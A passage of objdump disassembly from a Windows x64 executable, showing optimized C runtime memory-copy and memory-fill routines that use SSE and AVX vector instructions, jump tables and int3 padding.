   14000ebc7:	4c 0f 47 ca          	cmova  %rdx,%r9
   14000ebcb:	4c 3b ca             	cmp    %rdx,%r9
   14000ebce:	77 0d                	ja     0x14000ebdd
   14000ebd0:	f6 05 6d 00 01 00 02 	testb  $0x2,0x1006d(%rip)        # 0x14001ec44
   14000ebd7:	0f 85 63 fe ff ff    	jne    0x14000ea40
   14000ebdd:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000ebe1:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   14000ebe8:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000ebef:	0f 86 c3 00 00 00    	jbe    0x14000ecb8
   14000ebf5:	4c 8b c9             	mov    %rcx,%r9
   14000ebf8:	49 83 e1 1f          	and    $0x1f,%r9
   14000ebfc:	49 83 e9 20          	sub    $0x20,%r9
   14000ec00:	49 2b c9             	sub    %r9,%rcx
   14000ec03:	49 2b d1             	sub    %r9,%rdx
   14000ec06:	4d 03 c1             	add    %r9,%r8
   14000ec09:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000ec10:	0f 86 a2 00 00 00    	jbe    0x14000ecb8
   14000ec16:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000ec1d:	0f 87 3d 01 00 00    	ja     0x14000ed60
   14000ec23:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000ec2a:	84 00 00 00 00 00 
   14000ec30:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000ec34:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000ec39:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000ec3e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000ec43:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   14000ec47:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000ec4c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   14000ec51:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   14000ec56:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000ec5d:	00 
   14000ec5e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000ec65:	00 
   14000ec66:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000ec6d:	00 
   14000ec6e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000ec75:	00 
   14000ec76:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000ec7d:	00 
   14000ec7e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   14000ec85:	00 
   14000ec86:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000ec8d:	00 
   14000ec8e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   14000ec95:	00 
   14000ec96:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000ec9d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000eca4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000ecab:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000ecb2:	0f 83 78 ff ff ff    	jae    0x14000ec30
   14000ecb8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000ecbc:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000ecc0:	4d 8b d9             	mov    %r9,%r11
   14000ecc3:	49 c1 eb 05          	shr    $0x5,%r11
   14000ecc7:	47 8b 9c 9a 70 84 01 	mov    0x18470(%r10,%r11,4),%r11d
   14000ecce:	00 
   14000eccf:	4d 03 da             	add    %r10,%r11
   14000ecd2:	41 ff e3             	jmp    *%r11
   14000ecd5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000ecdc:	ff ff ff 
   14000ecdf:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   14000ece6:	ff ff ff 
   14000ece9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000ecf0:	ff ff ff 
   14000ecf3:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000ecfa:	ff ff ff 
   14000ecfd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000ed04:	ff ff ff 
   14000ed07:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000ed0e:	ff ff ff 
   14000ed11:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000ed18:	ff ff ff 
   14000ed1b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   14000ed22:	ff ff ff 
   14000ed25:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000ed2c:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   14000ed33:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000ed3a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   14000ed41:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000ed48:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000ed4f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000ed56:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000ed5a:	c5 f8 77             	vzeroupper
   14000ed5d:	c3                   	ret
   14000ed5e:	66 90                	xchg   %ax,%ax
   14000ed60:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000ed64:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000ed69:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000ed6e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000ed73:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   14000ed77:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000ed7c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   14000ed81:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   14000ed86:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000ed8d:	00 
   14000ed8e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000ed95:	00 
   14000ed96:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000ed9d:	00 
   14000ed9e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000eda5:	00 
   14000eda6:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000edad:	00 
   14000edae:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   14000edb5:	00 
   14000edb6:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000edbd:	00 
   14000edbe:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   14000edc5:	00 
   14000edc6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000edcd:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000edd4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000eddb:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000ede2:	0f 83 78 ff ff ff    	jae    0x14000ed60
   14000ede8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000edec:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000edf0:	4d 8b d9             	mov    %r9,%r11
   14000edf3:	49 c1 eb 05          	shr    $0x5,%r11
   14000edf7:	47 8b 9c 9a 94 84 01 	mov    0x18494(%r10,%r11,4),%r11d
   14000edfe:	00 
   14000edff:	4d 03 da             	add    %r10,%r11
   14000ee02:	41 ff e3             	jmp    *%r11
   14000ee05:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000ee0c:	ff ff ff 
   14000ee0f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   14000ee16:	ff ff ff 
   14000ee19:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000ee20:	ff ff ff 
   14000ee23:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   14000ee2a:	ff ff ff 
   14000ee2d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000ee34:	ff ff ff 
   14000ee37:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000ee3e:	ff ff ff 
   14000ee41:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000ee48:	ff ff ff 
   14000ee4b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   14000ee52:	ff ff ff 
   14000ee55:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000ee5c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   14000ee63:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000ee6a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   14000ee71:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000ee78:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   14000ee7f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000ee86:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000ee8a:	0f ae f8             	sfence
   14000ee8d:	c5 f8 77             	vzeroupper
   14000ee90:	c3                   	ret
   14000ee91:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000ee98:	0f 1f 84 00 00 00 00 
   14000ee9f:	00 
   14000eea0:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   14000eea7:	76 0d                	jbe    0x14000eeb6
   14000eea9:	f6 05 94 fd 00 00 02 	testb  $0x2,0xfd94(%rip)        # 0x14001ec44
   14000eeb0:	0f 85 8a fb ff ff    	jne    0x14000ea40
   14000eeb6:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000eeba:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   14000eec1:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000eec8:	0f 86 8e 00 00 00    	jbe    0x14000ef5c
   14000eece:	4c 8b c9             	mov    %rcx,%r9
   14000eed1:	49 83 e1 0f          	and    $0xf,%r9
   14000eed5:	49 83 e9 10          	sub    $0x10,%r9
   14000eed9:	49 2b c9             	sub    %r9,%rcx
   14000eedc:	49 2b d1             	sub    %r9,%rdx
   14000eedf:	4d 03 c1             	add    %r9,%r8
   14000eee2:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000eee9:	76 71                	jbe    0x14000ef5c
   14000eeeb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000eef0:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000eef4:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   14000eef9:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000eefe:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   14000ef03:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   14000ef07:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000ef0c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   14000ef11:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   14000ef16:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000ef1b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   14000ef20:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   14000ef25:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   14000ef2a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   14000ef2f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   14000ef34:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   14000ef39:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000ef3e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000ef45:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000ef4c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000ef53:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000ef5a:	73 94                	jae    0x14000eef0
   14000ef5c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000ef60:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000ef64:	4d 8b d9             	mov    %r9,%r11
   14000ef67:	49 c1 eb 04          	shr    $0x4,%r11
   14000ef6b:	47 8b 9c 9a b8 84 01 	mov    0x184b8(%r10,%r11,4),%r11d
   14000ef72:	00 
   14000ef73:	4d 03 da             	add    %r10,%r11
   14000ef76:	41 ff e3             	jmp    *%r11
   14000ef79:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   14000ef80:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   14000ef87:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000ef8e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   14000ef95:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000ef9c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   14000efa3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000efaa:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   14000efb1:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   14000efb8:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000efbf:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   14000efc6:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000efcd:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   14000efd4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000efdb:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   14000efe2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000efe6:	c3                   	ret
   14000efe7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000efee:	00 00 
   14000eff0:	0f 10 12             	movups (%rdx),%xmm2
   14000eff3:	48 2b d1             	sub    %rcx,%rdx
   14000eff6:	49 03 c8             	add    %r8,%rcx
   14000eff9:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000effe:	48 83 e9 10          	sub    $0x10,%rcx
   14000f002:	49 83 e8 10          	sub    $0x10,%r8
   14000f006:	f6 c1 0f             	test   $0xf,%cl
   14000f009:	74 18                	je     0x14000f023
   14000f00b:	4c 8b c9             	mov    %rcx,%r9
   14000f00e:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000f012:	0f 10 c8             	movups %xmm0,%xmm1
   14000f015:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000f019:	41 0f 11 09          	movups %xmm1,(%r9)
   14000f01d:	4c 8b c1             	mov    %rcx,%r8
   14000f020:	4c 2b c0             	sub    %rax,%r8
   14000f023:	4d 8b c8             	mov    %r8,%r9
   14000f026:	49 c1 e9 07          	shr    $0x7,%r9
   14000f02a:	74 71                	je     0x14000f09d
   14000f02c:	0f 29 01             	movaps %xmm0,(%rcx)
   14000f02f:	eb 16                	jmp    0x14000f047
   14000f031:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f038:	0f 1f 84 00 00 00 00 
   14000f03f:	00 
   14000f040:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000f044:	0f 29 09             	movaps %xmm1,(%rcx)
   14000f047:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000f04c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   14000f051:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   14000f058:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000f05c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   14000f060:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   14000f065:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000f06a:	49 ff c9             	dec    %r9
   14000f06d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   14000f071:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   14000f075:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000f07a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000f07f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   14000f083:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   14000f087:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000f08c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   14000f090:	75 ae                	jne    0x14000f040
   14000f092:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000f096:	49 83 e0 7f          	and    $0x7f,%r8
   14000f09a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000f09d:	4d 8b c8             	mov    %r8,%r9
   14000f0a0:	49 c1 e9 04          	shr    $0x4,%r9
   14000f0a4:	74 1a                	je     0x14000f0c0
   14000f0a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f0ad:	00 00 00 
   14000f0b0:	0f 11 01             	movups %xmm0,(%rcx)
   14000f0b3:	48 83 e9 10          	sub    $0x10,%rcx
   14000f0b7:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000f0bb:	49 ff c9             	dec    %r9
   14000f0be:	75 f0                	jne    0x14000f0b0
   14000f0c0:	49 83 e0 0f          	and    $0xf,%r8
   14000f0c4:	74 03                	je     0x14000f0c9
   14000f0c6:	0f 11 10             	movups %xmm2,(%rax)
   14000f0c9:	0f 11 01             	movups %xmm0,(%rcx)
   14000f0cc:	c3                   	ret
   14000f0cd:	cc                   	int3
   14000f0ce:	cc                   	int3
   14000f0cf:	cc                   	int3
   14000f0d0:	cc                   	int3
   14000f0d1:	cc                   	int3
   14000f0d2:	cc                   	int3
   14000f0d3:	cc                   	int3
   14000f0d4:	cc                   	int3
   14000f0d5:	cc                   	int3
   14000f0d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f0dd:	00 00 00 
   14000f0e0:	cc                   	int3
   14000f0e1:	cc                   	int3
   14000f0e2:	cc                   	int3
   14000f0e3:	cc                   	int3
   14000f0e4:	cc                   	int3
   14000f0e5:	cc                   	int3
   14000f0e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f0ed:	00 00 00 
   14000f0f0:	57                   	push   %rdi
   14000f0f1:	8b c2                	mov    %edx,%eax
   14000f0f3:	48 8b f9             	mov    %rcx,%rdi
   14000f0f6:	49 8b c8             	mov    %r8,%rcx
   14000f0f9:	f3 aa                	rep stos %al,(%rdi)
   14000f0fb:	49 8b c1             	mov    %r9,%rax
   14000f0fe:	5f                   	pop    %rdi
   14000f0ff:	c3                   	ret
   14000f100:	48 8b c1             	mov    %rcx,%rax
   14000f103:	4c 8b c9             	mov    %rcx,%r9
   14000f106:	4c 8d 15 f3 0e ff ff 	lea    -0xf10d(%rip),%r10        # 0x140000000
   14000f10d:	0f b6 d2             	movzbl %dl,%edx
   14000f110:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   14000f117:	01 01 01 
   14000f11a:	4c 0f af da          	imul   %rdx,%r11
   14000f11e:	66 49 0f 6e c3       	movq   %r11,%xmm0
   14000f123:	49 83 f8 0f          	cmp    $0xf,%r8
   14000f127:	0f 87 83 00 00 00    	ja     0x14000f1b0
   14000f12d:	0f 1f 00             	nopl   (%rax)
   14000f130:	49 03 c8             	add    %r8,%rcx
   14000f133:	47 8b 8c 82 e0 84 01 	mov    0x184e0(%r10,%r8,4),%r9d
   14000f13a:	00 
   14000f13b:	4d 03 ca             	add    %r10,%r9
   14000f13e:	41 ff e1             	jmp    *%r9
   14000f141:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   14000f145:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   14000f149:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000f14e:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f152:	c3                   	ret
   14000f153:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   14000f157:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000f15b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000f160:	c3                   	ret
   14000f161:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f168:	0f 1f 84 00 00 00 00 
   14000f16f:	00 
   14000f170:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   14000f174:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   14000f178:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f17c:	c3                   	ret
   14000f17d:	0f 1f 00             	nopl   (%rax)
   14000f180:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   14000f184:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   14000f188:	c3                   	ret
   14000f189:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   14000f18d:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000f192:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f196:	c3                   	ret
   14000f197:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   14000f19b:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000f19f:	c3                   	ret
   14000f1a0:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   14000f1a4:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000f1a9:	c3                   	ret
   14000f1aa:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   14000f1ae:	c3                   	ret
   14000f1af:	90                   	nop
   14000f1b0:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   14000f1b4:	49 83 f8 20          	cmp    $0x20,%r8
   14000f1b8:	77 0c                	ja     0x14000f1c6
   14000f1ba:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   14000f1be:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000f1c5:	c3                   	ret
   14000f1c6:	83 3d 83 ee 00 00 03 	cmpl   $0x3,0xee83(%rip)        # 0x14001e050
   14000f1cd:	0f 82 dd 01 00 00    	jb     0x14000f3b0
   14000f1d3:	4c 3b 05 7e ee 00 00 	cmp    0xee7e(%rip),%r8        # 0x14001e058
   14000f1da:	76 16                	jbe    0x14000f1f2
   14000f1dc:	4c 3b 05 7d ee 00 00 	cmp    0xee7d(%rip),%r8        # 0x14001e060
   14000f1e3:	77 0d                	ja     0x14000f1f2
   14000f1e5:	f6 05 58 fa 00 00 02 	testb  $0x2,0xfa58(%rip)        # 0x14001ec44
   14000f1ec:	0f 85 fe fe ff ff    	jne    0x14000f0f0
   14000f1f2:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   14000f1f8:	4c 8b c9             	mov    %rcx,%r9
   14000f1fb:	49 83 e1 1f          	and    $0x1f,%r9
   14000f1ff:	49 83 e9 20          	sub    $0x20,%r9
   14000f203:	49 2b c9             	sub    %r9,%rcx
   14000f206:	49 2b d1             	sub    %r9,%rdx
   14000f209:	4d 03 c1             	add    %r9,%r8
   14000f20c:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f213:	76 65                	jbe    0x14000f27a
   14000f215:	4c 3b 05 44 ee 00 00 	cmp    0xee44(%rip),%r8        # 0x14001e060
   14000f21c:	0f 87 ce 00 00 00    	ja     0x14000f2f0
   14000f222:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f229:	1f 84 00 00 00 00 00 
   14000f230:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   14000f234:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   14000f239:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   14000f23e:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   14000f243:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   14000f24a:	00 
   14000f24b:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   14000f252:	00 
   14000f253:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   14000f25a:	00 
   14000f25b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   14000f262:	00 
   14000f263:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f26a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f271:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f278:	73 b6                	jae    0x14000f230
   14000f27a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f27e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f282:	4d 8b d9             	mov    %r9,%r11
   14000f285:	49 c1 eb 05          	shr    $0x5,%r11
   14000f289:	47 8b 9c 9a 20 85 01 	mov    0x18520(%r10,%r11,4),%r11d
   14000f290:	00 
   14000f291:	4d 03 da             	add    %r10,%r11
   14000f294:	41 ff e3             	jmp    *%r11
   14000f297:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   14000f29e:	ff ff ff 
   14000f2a1:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   14000f2a8:	ff ff ff 
   14000f2ab:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   14000f2b2:	ff ff ff 
   14000f2b5:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   14000f2bc:	ff ff ff 
   14000f2bf:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   14000f2c6:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   14000f2cd:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   14000f2d4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000f2db:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f2df:	c5 f8 77             	vzeroupper
   14000f2e2:	c3                   	ret
   14000f2e3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f2ea:	84 00 00 00 00 00 
   14000f2f0:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   14000f2f4:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   14000f2f9:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   14000f2fe:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   14000f303:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   14000f30a:	00 
   14000f30b:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   14000f312:	00 
   14000f313:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   14000f31a:	00 
